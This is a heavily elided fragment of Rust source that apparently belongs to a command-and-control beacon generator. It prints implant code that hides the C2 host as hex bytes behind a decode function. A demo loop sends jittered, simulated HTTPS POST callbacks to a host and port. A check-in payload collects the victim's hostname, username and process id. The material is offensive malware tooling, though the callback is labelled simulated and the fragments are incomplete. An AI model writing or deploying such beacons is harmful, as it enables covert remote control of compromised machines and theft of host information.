...
fn print_usage(prog: &str) {
    ...
    println!("  {} --demo                     Run demo beacon (localhost)", prog);
    println!();
    println!("Examples:");
...
fn generate_beacon(host: &str, port: u16) {
    ...
    let encoded_host_hex: String = encoded_host.iter().map(|b| format!("0x{:02X}", b)).collect::<Vec<_>>().join(", ");
    ...
    println!(r#"fn decode_host() -> String {{
...
fn demo_beacon() {
    ...
    println!("║  Interval: {}s (±{}%)                                        ║", 
             interval.as_secs(), (jitter * 100.0) as u32);
    println!("╚═══════════════════════════════════════════════════════════════╝\n");
    ...
    loop {
        ...
        let jitter_amount = (interval.as_secs_f64() * jitter * (rand::random::<f64>() - 0.5) * 2.0) as i64;
        let sleep_ms = (interval.as_millis() as i64 + jitter_amount * 1000).max(1000) as u64;
        
        println!("[{}] Callback #{} - Simulating HTTPS POST to {}:{}...", 
                 chrono_time(), callback_count, host, port);
...
fn generate_checkin_payload() -> Vec<u8> {
    ...
    let checkin = format!(
        ...
        hostname, username, std::process::id(), chrono_time()
    );
